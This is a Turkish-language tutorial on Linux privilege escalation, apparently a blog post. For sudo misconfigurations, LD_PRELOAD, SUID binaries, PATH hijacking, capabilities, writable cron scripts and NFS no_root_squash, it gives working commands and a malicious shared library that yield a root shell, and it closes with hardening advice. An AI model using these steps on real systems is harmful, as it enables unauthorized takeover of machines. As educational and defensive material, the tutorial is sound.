Bir sisteme düşük yetkili bir kullanıcı olarak eriştiğinde iş bitmez — asıl hedef genellikle **root** olmaktır. Privilege escalation (yetki yükseltme), elindeki sınırlı erişimi sistemin tam kontrolüne çevirme sürecidir. Ve neredeyse her zaman aynı kökten beslenir: **bir yanlış yapılandırma.**

Bu yazıda Linux'ta en sık karşılaşılan yetki yükseltme yollarını tek tek ele alıyorum. Her başlıkta önce tekniğin ne olduğunu, sonra nasıl tespit edileceğini, ardından bir örnekle nasıl istismar edildiğini ve neden çalıştığını anlatıyorum.

> Uyarı: Bu teknikler yalnızca sahibi olduğun ya da test için yazılı izin aldığın sistemlerde denenmelidir (kendi lab'ın, HTB, THM vb.). İzinsiz kullanım suçtur.

## Nereden başlanır: enumeration

Yetki yükseltmenin %90'ı **doğru şeyi fark etmektir**. Sisteme düştüğünde önce ortamı tanımak gerekir. Elle bakılacak temel yerler:

```bash
id                      # hangi kullanıcı, hangi gruplardayım
sudo -l                 # sudo ile ne çalıştırabiliyorum
uname -a                # çekirdek sürümü
find / -perm -4000 -type f 2>/dev/null   # SUID dosyalar
getcap -r / 2>/dev/null                   # capability'ler
cat /etc/crontab                          # zamanlanmış görevler
```

Bu işi otomatikleştiren araçlar da var — en bilineni **LinPEAS**. Yine de aracın ne bulduğunu anlamak için altındaki mantığı bilmek şart. Şimdi o mantıklara bakalım.

Çoğu istismarda **[GTFOBins](https://gtfobins.github.io/)** sitesi paha biçilmezdir: bir binary'nin hangi yolla kabuk (shell) açtırdığını orada bulabilirsin.

---

## 1. sudo -l

**Nedir?** `sudo -l` komutu, mevcut kullanıcının **hangi komutları sudo ile çalıştırabileceğini** listeler. Yönetici, kullanıcıya belirli komutları root olarak çalıştırma izni vermiş olabilir. Sorun şu: izin verilen komut kabuk açtırabilen bir şeyse, o izin doğrudan root demektir.

**Tespit:**

```bash
sudo -l
```

Örnek çıktı:

```
User leon may run the following commands on victim:
    (root) NOPASSWD: /usr/bin/find
```

**Örnek:** Kullanıcı `find`'ı root olarak parolasız çalıştırabiliyor. `find`, `-exec` ile komut çalıştırabildiği için bu bir kabuğa dönüşür:

```bash
sudo find . -exec /bin/sh \; -quit
```

Bu komut root yetkisiyle bir `/bin/sh` başlatır — artık root'sun.

**Neden çalışıyor?** `find` root olarak koşuyor ve `-exec` ile başlattığı `/bin/sh` de root yetkisini miras alıyor. Yönetici "sadece dosya arasın" diye izin verdi, ama `find`'ın komut çalıştırma yeteneğini hesaba katmadı. (GTFOBins'te hangi binary'nin nasıl istismar edildiği yazar.)

---

## 2. LD_PRELOAD

**Nedir?** `LD_PRELOAD`, bir program çalışırken **kendi paylaşımlı kütüphaneni (.so) önce yükletmeni** sağlayan bir ortam değişkenidir. Normalde sudo, güvenlik için ortam değişkenlerini temizler. Ama `sudoers` dosyasında `env_keep += LD_PRELOAD` ayarı varsa, bu değişken korunur — ve root olarak çalışan bir komuta kendi kodumuzu enjekte edebiliriz.

**Tespit:** `sudo -l` çıktısında şunu ara:

```
Defaults        env_keep += LD_PRELOAD
```

**Örnek:** Önce kabuk açan küçük bir kütüphane yazıp derliyoruz:

```c
// evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles
```

Sonra sudo ile çalıştırabildiğimiz herhangi bir komutu, kütüphanemizi önyükleyerek koşturuyoruz:

```bash
sudo LD_PRELOAD=/tmp/evil.so apache2
```

Komut yüklenirken `evil.so` içindeki `_init` fonksiyonu root olarak çalışır ve bize root kabuğu verir.

**Neden çalışıyor?** `_init`, kütüphane belleğe yüklenir yüklenmez otomatik koşan bir fonksiyondur. Komut root olarak çalıştığı için kütüphane de root bağlamında yüklenir; içindeki `setuid(0)` + `/bin/bash` bize root kabuğu açar.

---

## 3. SUID ve SGID

**Nedir?** SUID (Set User ID) biti olan bir çalıştırılabilir dosya, onu **kim çalıştırırsa çalıştırsın, dosyanın sahibinin yetkisiyle** koşar. Sahip root ise, o binary root yetkisiyle çalışır. SGID aynı şeyin grup versiyonudur. Bu, `passwd` gibi bazı programlar için gereklidir — ama yanlış binary'de olursa felakettir.

**Tespit:**

```bash
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID
```

İzinlerde `s` harfi görürsün: `-rwsr-xr-x`.

**Örnek:** Diyelim `find` binary'sinde SUID biti var ve sahibi root:

```bash
-rwsr-xr-x 1 root root ... /usr/bin/find
```

O zaman:

```bash
find . -exec /bin/sh -p \; -quit
```

`-p` bayrağı, kabuğun yükseltilmiş yetkiyi düşürmemesini sağlar. Sonuç: root kabuğu.

**Neden çalışıyor?** SUID biti sayesinde `find` root olarak koşuyor; `-exec` ile başlattığı kabuk da bu yetkiyi taşıyor. Hangi SUID binary'nin nasıl istismar edileceğini yine GTFOBins'te bulursun (`nmap`, `vim`, `cp`, `bash` gibi onlarca binary listelidir).

---

## 4. PATH manipülasyonu

**Nedir?** `PATH`, kabuğun komutları hangi klasörlerde arayacağını belirleyen değişkendir. Eğer root olarak çalışan bir program (SUID bir binary ya da sudo'lu bir betik), başka bir komutu **tam yol vermeden** (örneğin `service` yerine `/usr/sbin/service`) çağırıyorsa, PATH'e kendi sahte komutumuzu koyup onu kandırabiliriz.

**Tespit:** SUID bir binary'nin içinde hangi komutların çağrıldığına bak:

```bash
strings /usr/bin/zayifprogram
```

Çıktıda tam yol içermeyen bir komut adı görürsen (örneğin sadece `service`), hedef odur.

**Örnek:** Program içeride `service` komutunu tam yol olmadan çağırıyor diyelim. Kendi `service`'imizi yazıp PATH'in başına koyarız:

```bash
cd /tmp
echo '/bin/bash' > service
chmod +x service
export PATH=/tmp:$PATH
/usr/bin/zayifprogram
```

Program `service`'i çağırınca, sistemdeki gerçek `service` yerine bizim `/tmp/service`'imizi bulur ve çalıştırır — root yetkisiyle bir bash açılır.

**Neden çalışıyor?** Kabuk komutu PATH'teki klasörlerde **soldan sağa** arar. `/tmp`'yi en başa koyduğumuz için sahte `service` önce bulunur. Program root koştuğu için sahte komut da root koşar.

---

## 5. Capabilities

**Nedir?** Linux capability'leri, root'un tüm gücünü tek bir binary'ye vermeden, **root yetkisinin küçük parçalarını** binary'lere tanıma yöntemidir. Mantık iyidir ama yanlış capability, tam root'a eşdeğer olabilir. En tehlikelisi `cap_setuid`'dir — binary'ye kullanıcı kimliğini değiştirme (yani root olma) gücü verir.

**Tespit:**

```bash
getcap -r / 2>/dev/null
```

Örnek çıktı:

```
/usr/bin/python3.8 = cap_setuid+ep
```

**Örnek:** Python'a `cap_setuid` verilmişse, kimliğimizi root'a çevirip kabuk açabiliriz:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Neden çalışıyor?** `cap_setuid+ep`, Python'a UID'yi değiştirme yetkisi verir. `os.setuid(0)` ile kendimizi root (UID 0) yaparız, ardından açtığımız bash root olur. GTFOBins, capability istismarları için de bir "Capabilities" bölümü içerir.

---

## 6. Cron Jobs (Zamanlanmış Görevler)

**Nedir?** Cron, komutları belirli zamanlarda otomatik çalıştıran zamanlayıcıdır. Görevler çoğu zaman **root olarak** koşar. Eğer bir cron görevinin çağırdığı betik **bizim yazabileceğimiz** bir dosyaysa, içine kendi komutumuzu ekleyip root olarak çalıştırabiliriz.

**Tespit:**

```bash
cat /etc/crontab
ls -la /etc/cron.*        # cron.d, cron.hourly, cron.daily...
```

Sonra çağrılan betiğin izinlerine bak — bize yazma yetkisi var mı:

```bash
ls -la /path/to/betik.sh
```

**Örnek:** `/etc/crontab`'da root'un her dakika çalıştırdığı bir betik var ve dosya herkese yazılabilir (`-rwxrwxrwx`):

```
* * * * * root /opt/backup.sh
```

İçine bir ters kabuk (reverse shell) ya da SUID atama komutu ekleriz:

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh
```

Cron bir dakika sonra bunu root olarak çalıştırır. Sonra:

```bash
/tmp/rootbash -p
```

Root kabuğu elimizde.

**Neden çalışıyor?** Betiği root çalıştırıyor ama dosyanın yazma iznini herkese açık bıraktıkları için içeriğini biz belirliyoruz. `chmod +s` ile `bash` kopyasına SUID verip root olarak açıyoruz. (Cron betikleri PATH kullanıyorsa, 4. maddedeki PATH hilesi de burada işe yarar.)

---

## 7. NFS (no_root_squash)

**Nedir?** NFS, ağ üzerinden dosya paylaşımı sağlar. Sunucu bir paylaşımı `no_root_squash` seçeneğiyle dışa açtıysa, o paylaşımda **uzaktaki root, gerçekten root olarak** dosya oluşturabilir. Bu, kendi makinemizde root olarak SUID bir binary yaratıp hedefte çalıştırmamıza olanak tanır.

**Tespit:** Hedefteki NFS dışa aktarımlarına bak:

```bash
cat /etc/exports
```

Tehlikeli satır şuna benzer:

```
/home/share  *(rw,sync,no_root_squash)
```

**Örnek:** Paylaşımı kendi (saldırgan) makinemize root olarak mount ederiz:

```bash
# saldırgan makinesinde (root)
mkdir /tmp/nfs
mount -o rw <hedef-ip>:/home/share /tmp/nfs
```

Sonra SUID root bir kabuk kopyası yaratırız:

```bash
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash
```

Şimdi **hedef makinede**, normal kullanıcı olarak o dosyayı çalıştırırız:

```bash
/home/share/rootbash -p
```

Root kabuğu açılır.

**Neden çalışıyor?** `no_root_squash` olmadan, uzak root normalde `nobody` kullanıcısına indirgenir (squash edilir). Bu seçenek o korumayı kapattığı için, bizim makinemizdeki root, paylaşımda gerçek root sahipliğiyle SUID dosya oluşturabiliyor. Hedef bu SUID biti onurlandırdığı için dosya orada da root olarak koşuyor.

---

## Toparlarken

Bütün bu tekniklerin ortak noktası tek cümle: **birine, ihtiyacından fazla yetki verilmiş.** Bir binary'ye gereksiz SUID, bir sudo kuralında fazla izin, herkese yazılabilir bir cron betiği, yanlış bir NFS seçeneği... Saldırgan olarak işin, bu fazlalıkları bulup birleştirmek.

Pratik akış: **enumerate et → yanlış yapılandırmayı fark et → GTFOBins'te yolunu bul → istismar et.** Elle bakmayı öğren, sonra LinPEAS gibi araçlarla hızlan — ama aracın neyi neden işaretlediğini her zaman anla.

## Savunma tarafı: bunlar nasıl kapatılır?

- **sudo:** Kullanıcılara komut bazında en az yetkiyi ver; `find`, `vim`, `nmap` gibi kabuk açtırabilen binary'lere sudo izni verme. `env_keep` listesini olabildiğince boş tut (`LD_PRELOAD`'u asla tutma).
- **SUID/SGID:** Gereksiz SUID bitlerini kaldır (`find / -perm -4000` ile denetle). Sadece gerçekten gereken sistem binary'lerinde kalsın.
- **PATH:** Root olarak çalışan betik ve programlarda komutları **tam yoluyla** çağır; asla göreli komut adı kullanma.
- **Capabilities:** Binary'lere capability atarken çok dikkatli ol; `cap_setuid` gibi güçlü yetkileri script diline (python, perl) verme.
- **Cron:** Cron betiklerinin sahibi root olmalı ve **sadece root yazabilmeli** (`chmod 700`). Betik yollarını mutlak ver.
- **NFS:** `no_root_squash`'tan kaçın; `root_squash` (varsayılan) kullan ve paylaşımları mümkün olduğunca kısıtla.

En özet haliyle: **en az yetki prensibi.** Her kullanıcı, her binary, her servis yalnızca işini yapacak kadar yetkiye sahip olmalı — fazlası, birinin yükseleceği bir merdivendir.
